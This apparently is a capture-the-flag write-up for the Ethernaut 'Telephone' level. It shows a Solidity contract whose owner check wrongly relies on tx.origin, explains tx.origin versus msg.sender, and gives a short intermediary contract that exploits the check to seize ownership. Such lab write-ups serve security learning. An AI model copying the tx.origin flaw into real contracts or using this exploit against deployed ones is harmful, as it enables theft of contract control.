# 04 Telephone

```
Claim ownership of the contract 
```
####  code
```

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}


```

#### Start 


### (1) `Claim ownership of the contract `


Looking at the code, You can see that the part that changes the owner is a  function`changeOwner()`

But you must pass an `if (tx.origin != msg.sender)` condition first.

####  `tx.origin`

assuming you have a chain of call contracts, `tx.origin` will always be the first caller in the chain of call contracts

####  `msg.sender` 

`msg.sender` is the sender of the tx call.

```
 A -call-> B -call-> C 
           |         |_ _ _ _ _ _ _ tx.origin = A
           |                        msg.sender = B
           |
           | tx.origin = A
           | msg.sender = A
```

To claim ownership, we need to write a contract to call the fucntion `changeOwner()` in contract Telephone


```
who wants to claim ownership -> contract ExploitTelephone -> contract Telephone
                                                                    |
                                                                    |
                                                                    | tx.origin = who wants to claim ownership
                                                                    | msg.sender = contract ExploitTelephone
```
will make us pass the condition `if (tx.origin != msg.sender)`

#### This is the code I used to claim ownership contract Telephone
```

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Telephone {
	function changeOwner(address _owner) external;

}

contract ExploitTelephone {
    
    function callChangeOwner(address _targetExploit) external{
        Telephone(_targetExploit).changeOwner(***address who wants to claim ownership***);
    }
}
```

Use the remix deploy contract `ExploitTelephone`  then call the function `callChangeOwner(address _targetExploit)` and confirm transaction

Click button Submit instance and confirm transaction

# !!! we passed !!!


